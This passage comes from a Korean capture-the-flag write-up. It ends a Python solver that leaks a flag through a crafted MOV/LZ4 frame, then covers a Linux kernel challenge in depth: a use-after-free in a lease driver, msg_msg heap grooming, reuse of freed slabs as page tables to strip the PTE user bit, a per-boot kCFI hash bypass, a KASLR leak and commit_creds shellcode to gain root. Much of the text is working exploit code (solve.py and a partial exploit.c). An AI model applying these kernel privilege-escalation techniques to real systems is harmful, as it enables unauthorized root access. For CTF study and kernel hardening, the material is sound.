    if (uncompressed_size, stored, compression) != (380, 383, 1):
        raise RuntimeError("unexpected reference NotchLC frame")

    # The reference packet is one all-literal LZ4 block: F0 FF 6E + 380 bytes.
    prefix = original[marker + 19 : marker + 19 + 252]
    if len(prefix) != 252:
        raise RuntimeError("truncated reference frame")

    literal_extension = 252 - 15
    match_length = 128
    match_extension = match_length - 19
    stale_offset = 300
    delta = 65536 + len(prefix) - stale_offset
    compressed = (
        bytes((0xFF, literal_extension))
        + prefix
        + struct.pack("<H", delta)
        + bytes((match_extension,))
    )
    packet = b"1CLN" + struct.pack("<III", 380, len(compressed), 1) + compressed

    # Preserve the supplied MOV's ftyp/moov metadata, replace its sole mdat
    # sample, and update stsz's per-sample length.  stco remains 28.
    moov_at = original.index(b"moov") - 4
    moov = bytearray(original[moov_at:])
    stsz = moov.index(b"stsz") - 4
    struct.pack_into(">I", moov, stsz + 20, len(packet))
    mdat = struct.pack(">I4s", len(packet) + 8, b"mdat") + packet
    return original[:20] + mdat + bytes(moov)


def upload_mov(session: requests.Session, state: dict, content: bytes) -> int:
    response = session.post(
        state["target"] + "/deliveries/new",
        data={"name": "historyleak", "version": "v001"},
        files={"media": ("historyleak.mov", content, "video/quicktime")},
        allow_redirects=False,
        timeout=30,
    )
    checked(response)
    return int(response.headers["Location"].rsplit("=", 1)[1])


def decode_still(png: bytes) -> tuple[int, int, list[int]]:
    if not png.startswith(b"\x89PNG\r\n\x1a\n"):
        raise RuntimeError("compare still is not a PNG")
    cursor = 8
    width = height = 0
    compressed = bytearray()
    while cursor < len(png):
        size = struct.unpack_from(">I", png, cursor)[0]
        kind = png[cursor + 4 : cursor + 8]
        data = png[cursor + 8 : cursor + 8 + size]
        cursor += 12 + size
        if kind == b"IHDR":
            width, height, depth, color, _, _, _ = struct.unpack(">IIBBBBB", data)
            if depth != 16 or color != 0:
                raise RuntimeError("unexpected still pixel format")
        elif kind == b"IDAT":
            compressed.extend(data)
        elif kind == b"IEND":
            break
    raw = zlib.decompress(bytes(compressed))
    stride = 1 + width * 2
    if len(raw) != height * stride:
        raise RuntimeError("unexpected PNG scanline length")
    values: list[int] = []
    for y in range(height):
        row = raw[y * stride : (y + 1) * stride]
        if row[0] != 0:
            raise RuntimeError("unexpected PNG filter")
        values.extend(struct.unpack(">" + "H" * width, row[1:]))
    return width, height, values


def pixels_to_notch_bytes(width: int, height: int, values: list[int]) -> bytes:
    result = bytearray()
    for y0 in range(0, height, 4):
        for x0 in range(0, width, 4):
            for dy in range(4):
                for dx in range(0, 4, 2):
                    first = max(0, min(15, round(values[(y0 + dy) * width + x0 + dx] / 0x1111)))
                    second = max(0, min(15, round(values[(y0 + dy) * width + x0 + dx + 1] / 0x1111)))
                    result.append(first | (second << 4))
    return bytes(result)


def leak_flag(session: requests.Session, state: dict) -> str:
    exploit = build_history_leak_mov()
    (ROOT / "history-leak.mov").write_bytes(exploit)
    delivery = upload_mov(session, state, exploit)
    response = session.post(
        state["target"] + "/compare",
        data={"delivery": str(delivery)},
        allow_redirects=False,
        timeout=90,
    )
    checked(response)
    job = int(response.headers["Location"].rsplit("=", 1)[1])
    response = checked(session.get(state["target"] + f"/compare/still?id={job}", timeout=30), (200,))
    (ROOT / "history-leak.png").write_bytes(response.content)

    width, height, pixels = decode_still(response.content)
    decoded = pixels_to_notch_bytes(width, height, pixels)
    # The first 64 bytes are the stale baseline history[300:364].
    leaked = decoded[:64]
    (ROOT / "history-leak.bin").write_bytes(leaked)
    start = leaked.find(b"FLAG{")
    end = leaked.find(b"}", start + 5)
    if start < 0 or end < 0:
        raise RuntimeError(f"flag not found in leak: {leaked!r}")
    flag = leaked[start : end + 1].decode("ascii")
    (ROOT / "flag.txt").write_text(flag + "\n", encoding="ascii")
    state.update({"producer": True, "leak_delivery": delivery, "compare_job": job, "flag": flag})
    STATE_PATH.write_text(json.dumps(state, indent=2), encoding="utf-8")
    print(f"[+] leaked flag: {flag}")
    return flag


def main() -> None:
    parser = argparse.ArgumentParser()
    parser.add_argument("--target", default="http://43.203.139.141:8000")
    parser.add_argument("--reuse", action="store_true")
    args = parser.parse_args()

    if args.reuse and STATE_PATH.exists():
        state = json.loads(STATE_PATH.read_text(encoding="utf-8"))
        session = login(state)
    else:
        session, state = bootstrap(args.target)
        print(f"[+] account={state['email']} delivery={state['delivery']}")
    wait_for_producer(session, state)
    leak_flag(session, state)


if __name__ == "__main__":
    main()
````

---

## 8. Circulation

### 결과

- 분야: pwn / Linux kernel
- 원격: `43.203.150.218:1337`
- 최종 익스플로잇 SHA-256: `84c20996be1436034a811f62ea393d6bf4b7a2a4bba438710340a67bab6b3e3f`
- 로컬 최종판 검증: 메인 반복 20/20, 독립 반복 10/10 성공
- CTFd 제출 결과: `Correct`

최종 플래그:

```text
FLAG{e9a2e3fd17eda1d6b8b69124c429662c4110aabfe8d27cdf8de31ae605392b80b547e18c43109d1fba8ff828b345e908e326b4a1bcc9ca6c03bf2e918328cad8b8fb93f969507303}
```

같은 값은 별도 `flag.txt`에도 저장했다.

### 1. 환경과 모듈 분석

제공된 `run.sh`는 2 vCPU, 128 MiB QEMU에서 커널 6.18.56을 실행한다. KASLR, NX, SMEP, SMAP, rehashed retpoline kCFI가 켜져 있고 KPTI는 꺼져 있다. `/drop`은 익스플로잇을 UID/GID 1000으로 실행하며 `RLIMIT_NPROC=0`을 설정하므로 새 프로세스나 스레드에 의존할 수 없다.

`lease.ko` 디스어셈블리에서 복원한 주요 ioctl은 다음과 같다.

| 이름 | 값 | 역할 |
|---|---:|---|
| `LE_CREATE` | `0xc0084c01` | lease 객체 생성 |
| `LE_DESTROY` | `0x40044c02` | xarray에서 제거 후 해제 |
| `LE_ACQUIRE` | `0x40044c03` | 객체를 파일 컨텍스트에 연결 |
| `LE_FLUSH` | `0x00004c04` | ops의 간접 콜백 실행 |
| `LE_SET` | `0x40384c05` | 데이터 설정 및 dirty 표시 |
| `LE_GET` | `0xc0384c06` | 데이터 조회 |
| `LE_INFO` | `0xc0104c07` | 상태 조회 |

논리적인 객체 크기는 72바이트이고 첫 qword에는 ops 포인터와 하위 상태 비트가 함께 들어 있다.

```c
struct lease_entry {
    uint64_t ops_and_state; /* bit 0=valid, 1=dirty, 2=leased */
    uint32_t id;
    uint32_t kind;
    uint32_t len;
    uint8_t  data[0x30];
};
```

실제 `lease_entry` 전용 SLUB 캐시는 정렬 때문에 객체 간격이 `0x80`이다. 한 order-0 페이지에 정확히 32개가 들어간다.

```text
object_size=72, size=128, align=64
objs_per_slab=32, order=0, cpu_partial=120
```

### 2. 취약점: clean lease의 UAF

`LE_ACQUIRE`는 bit 2를 원자적으로 설정하고 객체 포인터를 파일의 8바이트 컨텍스트에 저장한다. 정상적인 `LE_DESTROY`라면 leased 상태가 끝날 때까지 기다린 뒤 객체를 해제해야 한다.

하지만 실제 코드는 dirty bit인 bit 1이 설정된 경우에만 대기 경로로 들어간다. 데이터가 수정되지 않은 clean 객체는 상태가 `0x4`인 채로도 즉시 `kmem_cache_free()`된다. acquire한 파일 컨텍스트에는 해제된 객체 포인터가 그대로 남는다.

재현 순서는 다음과 같다.

1. A에서 `CREATE → ACQUIRE → DESTROY`하여 dangling fd를 만든다.
2. 즉시 새 객체 B를 만들면 같은 SLUB 슬롯을 재사용한다.
3. B를 acquire한 뒤 A를 닫으면 stale release가 B의 bit 2를 지운다.
4. B가 여전히 사용 중인데도 다른 fd가 다시 acquire할 수 있다.

이 same-slot UAF는 16/16회 재현되었다. stale fd를 닫으면 dangling 주소의 `value &= ~4`를 수행하고, stale fd에서 `LE_FLUSH`를 호출하면 재활용된 첫 qword를 ops 포인터로 사용해 간접 호출한다. 따라서 다음 두 primitive를 얻는다.

- 해제된 `0x80` 간격 주소의 bit 2 clear
- 같은 주소에서 공격자가 준비한 ops를 통한 stale indirect call

### 3. Phase B: `msg_msg`로 정확한 dangling 슬롯 찾기

먼저 lease 객체 2048개, 즉 64개 slab 페이지를 만든다. 각 slab에서 4개 슬롯에 대해 probe/trigger 두 dangling fd가 같은 주소를 가리키도록 만들고 모든 lease 객체를 해제한다.

해제된 페이지는 SysV 메시지의 `kmalloc-cg-96` 객체로 재활용한다. `msg_msg` 헤더 48바이트와 payload 48바이트를 합쳐 96바이트가 된다.

```text
kmalloc-cg-96: 96-byte object, align 32, 42 objects/order-0 page
16 queues × 126 messages = 2016 messages = 48 full slab pages
```

메시지 수를 42의 정확한 배수로 만든 이유가 중요하다. 처음 사용한 2048개 메시지는 마지막 slab에 10개의 빈 슬롯을 남겼다. target 메시지를 dequeue한 뒤 다시 enqueue할 때 그 빈 슬롯을 먼저 사용하는 경우가 생겨 성공률이 약 85%로 떨어졌다. 2016개로 맞추자 마지막 slab까지 가득 차고, 같은 CPU에서의 free 직후 allocation이 target 슬롯을 안정적으로 돌려주었다.

lease 간격은 `0x80`, 메시지 간격은 `0x60`이므로 dangling offset은 modulo `0x60`에서 `0`, `0x20`, `0x40`을 반복한다. `0x40`만 메시지 payload 안에 들어가며 실제 관측 위치는 항상 payload word 2였다. payload는 모두 다음 marker로 채운다.

```c
0x4141414141414104ULL
```

probe fd를 닫았을 때 재활용에 성공한 슬롯은 marker가 `...04 → ...00`으로 변한다. 이 커널에는 `MSG_COPY`가 없으므로 메시지마다 고유 mtype을 주고 `msgrcv(type) → 검사 → 즉시 msgsnd()`로 원래 크기의 객체를 복원했다. 메시지 spray와 최종 dequeue/requeue는 CPU 0에서 수행한다.

marker가 변한 메시지를 찾으면 남아 있는 trigger fd가 동일한 주소를 가리킨다는 뜻이다. 마지막에는 해당 메시지 payload를 `fake_ops | 4`로 교체한다.

### 4. Phase A: lease slab을 PTE 페이지로 재활용

SMEP 때문에 일반 user mapping의 셸코드를 커널에서 실행할 수 없다. 두 번째 lease slab population을 page-table page로 재활용하고 stale release로 PTE의 U/S 비트를 지웠다.

하나의 4 KiB memfd 코드 페이지를 여러 주소에 공유 매핑한다. 각 2 MiB 영역마다 32개 주소를 `0x10000` 간격으로 배치한다.

```text
PTE index step = 0x10000 / 0x1000 = 16
PTE byte step  = 16 × 8 = 0x80
```

따라서 PTE qword의 간격이 lease 객체 간격 `0x80`과 정확히 일치한다. 64개 lease slab 페이지를 비운 뒤 각 영역을 처음 touch하면 freed slab이 PTE 페이지로 재사용된다. dangling fd를 닫을 때 PTE bit 2, 즉 U/S 비트가 지워진다.

CPU 0에는 이전 user PTE가 TLB에 남아 있을 수 있으므로 CPU 1로 이동해 alias를 읽어 본다. SIGSEGV가 나는 alias는 동일 memfd 페이지를 가리키지만 PTE가 supervisor-only로 바뀐 주소다. 정상 RW alias를 통해 같은 물리 페이지에 fake ops와 셸코드를 쓸 수 있고, 커널은 supervisor alias를 통해 이를 읽고 실행한다. 이로써 SMEP와 SMAP을 모두 만족한다.

### 5. 부팅마다 바뀌는 kCFI 우회

취약한 `LE_FLUSH` 간접 호출은 다음 형태로 kCFI 타입을 검사한다.

```asm
mov    (%rax), %r11
mov    $runtime_negative_hash, %r10d
add    -0xf(%r11), %r10d
jne    ud2
call   *%r11
```

모듈의 정적 flush 타입 해시는 `0x1c271bf8`이다. 하지만 `cfi=debug` 부팅은 매번 `cfi_seed`를 serial console에 출력하고 모든 preamble과 callsite를 다시 해시한다. 공식 x86 구현과 동일하게 다음 계산을 사용했다.

```c
uint32_t h = 0x1c271bf8 ^ seed;
while (is_endbr(h) || is_endbr(-h)) {
    uint32_t lsb = h & 1;
    h >>= 1;
    if (lsb)
        h ^= 0x80200003;
}
```

`solve.py`가 부팅 로그에서 seed를 캡처하고 익스플로잇의 `CFI_SEED_HEX?` 입력으로 전달한다. 익스플로잇은 계산한 runtime hash를 셸코드 target의 `target - 0xf`에 기록한다.

참고한 커널 구현은 Linux의 [`arch/x86/kernel/alternative.c`](https://github.com/torvalds/linux/blob/master/arch/x86/kernel/alternative.c)이고, `cfi=debug`의 의미는 [kernel parameters 문서](https://docs.kernel.org/6.18/admin-guide/kernel-parameters.html)에 설명되어 있다.

### 6. KASLR 해결과 root 획득

fake callback은 supervisor alias에 놓이며 `ENDBR64`로 시작한다. CPL0에서 `RDMSR(IA32_LSTAR)`를 실행하면 `entry_SYSCALL_64` 주소를 얻을 수 있다. 이 커널에서 해당 심볼은 `_text + 0x80`이므로 KASLR base를 계산할 수 있다.

사용한 심볼 오프셋은 다음과 같다.

```text
entry_SYSCALL_64    = _text + 0x00000080
commit_creds        = _text + 0x002c9900
prepare_kernel_cred = _text + 0x002c9b30
init_task           = _text + 0x00e0d140
```

`prepare_kernel_cred(NULL)`은 이 커널에서 trap이 발생하므로 `init_task`를 인자로 전달한다.

```c
new = prepare_kernel_cred(&init_task);
commit_creds(new);
```

콜백이 반환되면 UID/GID가 0이 되고 `/flag`를 읽는다.

### 7. 빌드와 실행

Linux 또는 WSL에서 정적 바이너리를 빌드한다.

```bash
gcc -O2 -static -Wall -Wextra -Werror -o exploit exploit.c
sha256sum exploit
```

CTFd access token을 인자, 파일, 또는 환경 변수로 전달할 수 있다.

```bash
python3 solve.py --token 'YOUR_CTFD_ACCESS_TOKEN'

# 또는
UHCON_CTFD_TOKEN='YOUR_CTFD_ACCESS_TOKEN' python3 solve.py
```

스크립트는 토큰 인증, base64 업로드, per-boot seed 중계, 플래그 추출을 한 연결에서 자동으로 수행한다.

원격 성공 로그의 핵심은 다음과 같았다.

```text
cfi_seed: 0xdfa359a2
runtime_hash=0xc384425a
msg match after 4 probes: object=64 queue=13 index=66 word=2
supervisor alias=0x400000050000 after 6 checks
uid=0 gid=0
```

CTFd는 최종 제출에 `Correct`를 반환했다.

### 최종 풀이 코드 전체

아래 코드는 최종 원격 uploader, 커널 exploit, 재현 빌드 스크립트의 원문 전체다. CTFd access token은 하드코딩하지 않고 `--token`, `--token-file`, 또는 `UHCON_CTFD_TOKEN`으로만 받는다.

#### `solve.py`

```python
#!/usr/bin/env python3
"""Remote solver for UHCON Circulation.

The launcher uploads the adjacent static ``exploit`` binary, captures the
per-boot kCFI seed from the serial console, and relays it when the exploit asks.
"""

from __future__ import annotations

import argparse
import base64
import os
from pathlib import Path
import re
import socket
import sys
import time


DEFAULT_HOST = "43.203.150.218"
DEFAULT_PORT = 1337
FLAG_RE = re.compile(rb"(?:FLAG|UHCON|UHC)\{[^}\r\n]+\}")
SEED_RE = re.compile(rb"cfi_seed: 0x([0-9a-fA-F]{8})")


def emit(data: bytes, quiet: bool) -> None:
    if not quiet:
        sys.stdout.buffer.write(data)
        sys.stdout.buffer.flush()


def recv_until(
    sock: socket.socket,
    marker: bytes,
    timeout: float,
    transcript: bytearray,
    quiet: bool,
) -> None:
    deadline = time.monotonic() + timeout
    while marker not in transcript:
        remaining = deadline - time.monotonic()
        if remaining <= 0:
            raise TimeoutError(f"timed out waiting for {marker!r}")
        sock.settimeout(min(remaining, 5.0))
        chunk = sock.recv(65536)
        if not chunk:
            raise EOFError(f"connection closed before {marker!r}")
        transcript.extend(chunk)
        emit(chunk, quiet)


def load_token(args: argparse.Namespace) -> str:
    if args.token:
        return args.token.strip()
    if args.token_file:
        return args.token_file.read_text(encoding="utf-8").strip()
    token = os.environ.get("UHCON_CTFD_TOKEN", "").strip()
    if token:
        return token
    raise SystemExit(
        "provide --token, --token-file, or the UHCON_CTFD_TOKEN environment variable"
    )


def main() -> int:
    root = Path(__file__).resolve().parent
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("--host", default=DEFAULT_HOST)
    parser.add_argument("--port", type=int, default=DEFAULT_PORT)
    parser.add_argument("--token")
    parser.add_argument("--token-file", type=Path)
    parser.add_argument("--exploit", type=Path, default=root / "exploit")
    parser.add_argument("--timeout", type=float, default=180.0)
    parser.add_argument("--transcript", type=Path, default=root / "remote.log")
    parser.add_argument("--quiet", action="store_true")
    args = parser.parse_args()

    token = load_token(args)
    raw_exploit = args.exploit.read_bytes()
    encoded = base64.b64encode(raw_exploit)
    if len(encoded) > 8_000_000:
        raise SystemExit("base64 exploit exceeds the service limit")
    upload = b"\n".join(
        encoded[offset:offset + 76] for offset in range(0, len(encoded), 76)
    ) + b"\n\n"

    transcript = bytearray()
    seed: bytes | None = None
    seed_sent = False
    try:
        with socket.create_connection((args.host, args.port), timeout=15) as sock:
            recv_until(
                sock, b"CTFd access token: ", 20, transcript, args.quiet
            )
            sock.sendall(token.encode() + b"\n")
            recv_until(
                sock,
                b"base64 exploit, empty line to end:",
                90,
                transcript,
                args.quiet,
            )
            sock.sendall(upload)

            deadline = time.monotonic() + args.timeout
            while time.monotonic() < deadline:
                sock.settimeout(min(5.0, deadline - time.monotonic()))
                try:
                    chunk = sock.recv(65536)
                except socket.timeout:
                    continue
                if not chunk:
                    break
                transcript.extend(chunk)
                emit(chunk, args.quiet)

                window = bytes(transcript[-8192:])
                if seed is None:
                    match = SEED_RE.search(window)
                    if match:
                        seed = match.group(1)
                if seed is not None and not seed_sent and b"CFI_SEED_HEX?" in window:
                    sock.sendall(seed + b"\n")
                    seed_sent = True

                flag = FLAG_RE.search(transcript)
                if flag:
                    args.transcript.write_bytes(transcript)
                    value = flag.group(0).decode("ascii", "replace")
                    print(f"\n[+] {value}")
                    return 0
    finally:
        args.transcript.write_bytes(transcript)

    raise SystemExit(f"flag not found; transcript saved to {args.transcript}")


if __name__ == "__main__":
    raise SystemExit(main())
```

#### `exploit.c`

```c
#define _GNU_SOURCE

#include <errno.h>
#include <fcntl.h>
#include <setjmp.h>
#include <sched.h>
#include <signal.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/resource.h>
#include <sys/stat.h>
#include <sys/syscall.h>
#include <sys/types.h>
#include <unistd.h>

/* Recovered directly from lease.ko. */
#define LE_CREATE   0xc0084c01UL
#define LE_DESTROY  0x40044c02UL
#define LE_ACQUIRE  0x40044c03UL
#define LE_FLUSH    0x00004c04UL

#define PAGE_SIZE_  0x1000UL
#define PMD_SIZE_   0x200000UL
#define SLOT_SIZE   0x80UL
#define SLOTS_PAGE  32U

/* 64 order-0 lease slabs. 13 can be retained (5 node + 8 CPU partial). */
#define LEASE_OBJECTS 2048U
#define PTE_GROUPS    64U
#define REFS_PER_SLAB 4U
#define SLAB_COUNT    (LEASE_OBJECTS / SLOTS_PAGE)
#define STALE_REFS    (SLAB_COUNT * REFS_PER_SLAB)

/* 48-byte msg_msg header + 48 bytes of text => kmalloc-96. */
#define MSG_QUEUES      16U
/* kmalloc-cg-96 has 42 objects/slab; 16 * 126 = exactly 48 full slabs. */
#define MSGS_PER_QUEUE 126U

/* A quiet, normally unused 64-TiB user range. */
#define PT_BASE 0x0000400000000000ULL

#define KCFI_OP_HASH 0x1c271bf8U
#define MARKER       0x4141414141414104ULL
#define MARKER_CLEAR (MARKER & ~4ULL)

struct create_req {
    uint32_t id;
    uint32_t kind;
};

struct stale_pair {
    int probe_fd;
    int trigger_fd;
    uint32_t id;
};

struct spray_msg {
    long type;
    uint64_t data[6];
};

struct message_hit {
    unsigned queue;
    unsigned index;
    unsigned word;
};

static sigjmp_buf fault_env;
static volatile sig_atomic_t fault_probe;

static void die(const char *what)
{
    dprintf(1, "[-] %s: errno=%d (%s)\n", what, errno, strerror(errno));
    _exit(1);
}

static void write_all(int fd, const void *buffer, size_t length)
{
    const unsigned char *cursor = buffer;
    while (length) {
        ssize_t n = write(fd, cursor, length);
        if (n < 0) {
            if (errno == EINTR)
                continue;
            die("write");
        }
        cursor += (size_t)n;
        length -= (size_t)n;
    }
}

static void pin_cpu(int cpu)
{
    cpu_set_t set;
    CPU_ZERO(&set);
    CPU_SET(cpu, &set);
    if (sched_setaffinity(0, sizeof(set), &set) != 0)
        die("sched_setaffinity");
}

static int lease_open(void)
{
    int fd = open("/dev/lease", O_RDWR | O_CLOEXEC);
    if (fd < 0)
        die("open /dev/lease");
    return fd;
}

static uint32_t lease_create(int fd)
{
    struct create_req req = {.id = 0, .kind = 0};
    if (ioctl(fd, LE_CREATE, &req) != 0)
        die("LE_CREATE");
    return req.id;
}

static void lease_acquire(int fd, uint32_t id)
{
    if (ioctl(fd, LE_ACQUIRE, &id) != 0)
        die("LE_ACQUIRE");
}

static void lease_destroy(int fd, uint32_t id)
{
    if (ioctl(fd, LE_DESTROY, &id) != 0)
        die("LE_DESTROY");
}

static int xmemfd(const char *name)
{
    int fd = (int)syscall(SYS_memfd_create, name, MFD_CLOEXEC);
    if (fd < 0)
        die("memfd_create");
    return fd;
}

static void *fixed_alias(uintptr_t address, int fd)
{
    void *wanted = (void *)address;
    void *result = mmap(wanted, PAGE_SIZE_,
                        PROT_READ | PROT_WRITE | PROT_EXEC,
                        MAP_SHARED | MAP_FIXED_NOREPLACE, fd, 0);
    if (result == MAP_FAILED)
        die("mmap fixed alias");
    if (result != wanted) {
        errno = EFAULT;
        die("mmap returned wrong address");
    }
    return result;
}

static void fault_handler(int sig, siginfo_t *info, void *context)
{
    (void)sig;
    (void)info;
    (void)context;
    if (fault_probe)
        siglongjmp(fault_env, 1);
    _exit(128 + SIGSEGV);
}

static int user_readable(volatile unsigned char *address)
{
    if (sigsetjmp(fault_env, 1) != 0) {
        fault_probe = 0;
        return 0;
    }
    fault_probe = 1;
    (void)*address;
    fault_probe = 0;
    return 1;
}

static int find_cleared_message(const int queues[MSG_QUEUES],
                                struct message_hit *hit)
{
    struct spray_msg message;

    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        for (unsigned index = 0; index < MSGS_PER_QUEUE; index++) {
            /*
             * CONFIG_CHECKPOINT_RESTORE is disabled, so MSG_COPY is absent.
             * Remove by unique mtype and immediately reinsert the identical
             * allocation; same-CPU SLUB LIFO preserves its address.
             */
            ssize_t length = msgrcv(queues[queue], &message,
                                    sizeof(message.data), (long)index + 1,
                                    IPC_NOWAIT | MSG_NOERROR);
            if (length != (ssize_t)sizeof(message.data))
                die("msgrcv scan");
            int found = 0;
            unsigned found_word = 0;
            for (unsigned word = 0; word < 6; word++) {
                if (message.data[word] == MARKER_CLEAR) {
                    found = 1;
                    found_word = word;
                    break;
                }
            }
            if (msgsnd(queues[queue], &message, sizeof(message.data),
                       IPC_NOWAIT) != 0)
                die("msgsnd scan restore");
            if (found) {
                hit->queue = queue;
                hit->index = index;
                hit->word = found_word;
                return 1;
            }
        }
    }
    return 0;
}

static void replace_message(int queue, const struct message_hit *hit,
                            uint64_t fake_entry_word)
{
    struct spray_msg message;

    ssize_t length = msgrcv(queue, &message, sizeof(message.data),
                            (long)hit->index + 1,
                            IPC_NOWAIT | MSG_NOERROR);
    if (length != (ssize_t)sizeof(message.data))
        die("msgrcv replace");
    message.type = (long)hit->index + 1;
    for (unsigned word = 0; word < 6; word++)
        message.data[word] = fake_entry_word;
    if (msgsnd(queue, &message, sizeof(message.data), IPC_NOWAIT) != 0)
        die("msgsnd replace");
}

static int is_endbr_word(uint32_t value)
{
    return value == 0xfa1e0ff3U || value == 0xfb1e0ff3U;
}

static uint32_t runtime_cfi_hash(uint32_t seed)
{
    uint32_t hash = KCFI_OP_HASH ^ seed;

    while (is_endbr_word(hash) || is_endbr_word(0U - hash)) {
        uint32_t lsb = hash & 1U;
        hash >>= 1;
        if (lsb)
            hash ^= 0x80200003U;
    }
    return hash;
}

static uint32_t read_cfi_seed(void)
{
    char line[64];
    char *end = NULL;

    dprintf(1, "CFI_SEED_HEX?\n");
    ssize_t count = read(STDIN_FILENO, line, sizeof(line) - 1);
    if (count <= 0)
        die("read cfi seed");
    line[count] = '\0';
    errno = 0;
    unsigned long value = strtoul(line, &end, 16);
    if (errno != 0 || end == line || value > UINT32_MAX) {
        errno = EINVAL;
        die("parse cfi seed");
    }
    return (uint32_t)value;
}

static void install_payload(uint8_t *rw_alias, uintptr_t supervisor_alias,
                            uint32_t cfi_hash)
{
    /*
     * Called as int flush(void *entry).  KCFI reads target[-0xf].
     * The shellcode reads IA32_LSTAR and uses the fixed vmlinux offsets:
     *   entry_SYSCALL_64    = base + 0x80
     *   init_task           = base + 0xe0d140
     *   prepare_kernel_cred = base + 0x2c9b30
     *   commit_creds        = base + 0x2c9900
     */
    static const unsigned char shellcode[] = {
        0xf3, 0x0f, 0x1e, 0xfa,                   /* endbr64 */
        0x53,                                     /* push rbx; align stack */
        0xb9, 0x82, 0x00, 0x00, 0xc0,             /* mov ecx,0xc0000082 */
        0x0f, 0x32,                               /* rdmsr */
        0x48, 0xc1, 0xe2, 0x20,                   /* shl rdx,32 */
        0x48, 0x09, 0xd0,                         /* or rax,rdx */
        0x48, 0x2d, 0x80, 0x00, 0x00, 0x00,       /* sub rax,0x80 */
        0x48, 0x89, 0xc3,                         /* mov rbx,rax */
        0x48, 0x8d, 0xbb, 0x40, 0xd1, 0xe0, 0x00, /* lea rdi,[rbx+0xe0d140] */
        0x48, 0x8d, 0x83, 0x30, 0x9b, 0x2c, 0x00, /* lea rax,[rbx+0x2c9b30] */
        0xff, 0xd0,                               /* call rax */
        0x48, 0x89, 0xc7,                         /* mov rdi,rax */
        0x48, 0x8d, 0x83, 0x00, 0x99, 0x2c, 0x00, /* lea rax,[rbx+0x2c9900] */
        0xff, 0xd0,                               /* call rax */
        0x5b,                                     /* pop rbx */
        0x31, 0xc0,                               /* xor eax,eax */
        0xc3                                      /* ret */
    };

    const size_t ops_offset = 0x100;
    const size_t code_offset = 0x200;
    uintptr_t target = supervisor_alias + code_offset;

    memset(rw_alias, 0x90, PAGE_SIZE_);
    *(uint64_t *)(rw_alias + ops_offset) = target;
    rw_alias[code_offset - 0x10] = 0xb8; /* mov imm32,%eax KCFI preamble */
    *(uint32_t *)(rw_alias + code_offset - 0xf) = cfi_hash;
    memcpy(rw_alias + code_offset, shellcode, sizeof(shellcode));
    __builtin___clear_cache((char *)rw_alias, (char *)rw_alias + PAGE_SIZE_);
}

static void print_flag(void)
{
    char buffer[256];
    int fd = open("/flag", O_RDONLY);
    if (fd < 0)
        die("open /flag");
    ssize_t n = read(fd, buffer, sizeof(buffer));
    if (n < 0)
        die("read /flag");
    dprintf(1, "[+] uid=%d gid=%d flag=", getuid(), getgid());
    if (n)
        write_all(1, buffer, (size_t)n);
    if (!n || buffer[n - 1] != '\n')
        write_all(1, "\n", 1);
}

int main(void)
{
    setvbuf(stdout, NULL, _IONBF, 0);

    uint32_t cfi_seed = read_cfi_seed();
    uint32_t cfi_hash = runtime_cfi_hash(cfi_seed);
    dprintf(1, "[*] cfi_seed=%#x static_hash=%#x runtime_hash=%#x\n",
            cfi_seed, KCFI_OP_HASH, cfi_hash);

    struct rlimit limit;
    if (getrlimit(RLIMIT_NOFILE, &limit) != 0)
        die("getrlimit");
    limit.rlim_cur = limit.rlim_max;
    if (setrlimit(RLIMIT_NOFILE, &limit) != 0)
        die("setrlimit");

    long cpus = sysconf(_SC_NPROCESSORS_ONLN);
    dprintf(1, "[*] circulation exploit: uid=%d cpus=%ld nofile=%lu\n",
            getuid(), cpus, (unsigned long)limit.rlim_cur);
    if (cpus < 2) {
        errno = ENODEV;
        die("need two CPUs");
    }
    pin_cpu(0);

    /* One shared physical page, later exposed through many PTEs. */
    int code_fd = xmemfd("circulation-code");
    if (ftruncate(code_fd, PAGE_SIZE_) != 0)
        die("ftruncate code");
    uint8_t *code_rw = mmap(NULL, PAGE_SIZE_,
                            PROT_READ | PROT_WRITE | PROT_EXEC,
                            MAP_SHARED, code_fd, 0);
    if (code_rw == MAP_FAILED)
        die("mmap code rw");
    code_rw[0] = 0x90; /* allocate the shmem page before lease slabs are freed */

    for (unsigned group = 0; group < PTE_GROUPS; group++) {
        uintptr_t group_base = PT_BASE + (uintptr_t)group * PMD_SIZE_;
        for (unsigned slot = 0; slot < SLOTS_PAGE; slot++)
            fixed_alias(group_base + (uintptr_t)slot * 0x10000UL, code_fd);
    }

    /* Pre-create upper paging levels without pre-creating target PTE pages. */
    volatile uint8_t *warm = fixed_alias(
        PT_BASE + (uintptr_t)(PTE_GROUPS + 1) * PMD_SIZE_ + PAGE_SIZE_,
        code_fd);
    (void)*warm;

    int queues[MSG_QUEUES];
    for (unsigned queue = 0; queue < MSG_QUEUES; queue++) {
        queues[queue] = msgget(IPC_PRIVATE, 0600 | IPC_CREAT);
        if (queues[queue] < 0)
            die("msgget");
    }

    struct stale_pair *pairs = calloc(STALE_REFS, sizeof(*pairs));
    int *pte_fds = calloc(STALE_REFS, sizeof(*pte_fds));
    uint32_t *object_ids = calloc(LEASE_OBJECTS, sizeof(*object_ids));
    if (!pairs || !pte_fds || !object_ids)
        die("calloc");

    int control_fd = lease_open();
    dprintf(1, "[*] phase B: allocating %u objects, %u paired references\n",
            LEASE_OBJECTS, STALE_REFS);
    for (unsigned i = 0; i < LEASE_OBJECTS; i++) {
        object_ids[i] = lease_create(control_fd);
    }
    unsigned pair_count = 0;
    for (unsigned group = 0; group < SLAB_COUNT; group++) {
        for (unsigned ref = 0; ref < REFS_PER_SLAB; ref++) {
            unsigned i = group * SLOTS_PAGE + ref;
            int helper = lease_open();
            lease_acquire(helper, object_ids[i]);
            lease_destroy(control_fd, object_ids[i]);

            uint32_t replacement = lease_create(control_fd);
            int probe = lease_open();
            lease_acquire(probe, replacement);

            /* The old stale release clears bit 2 in the immediate replacement. */
            if (close(helper) != 0)
                die("close alias builder");

            int trigger = lease_open();
            lease_acquire(trigger, replacement);
            object_ids[i] = replacement;
            pairs[pair_count].probe_fd = probe;
            pairs[pair_count].trigger_fd = trigger;
            pairs[pair_count].id = replacement;
            pair_count++;
        }
    }
    for (unsigned i = 0; i < LEASE_OBJECTS; i++)
        lease_destroy(control_fd, object_ids[i]);

    /* Reclaim released lease slab pages with kmalloc-96 msg_msg objects. */
    struct spray_msg message;
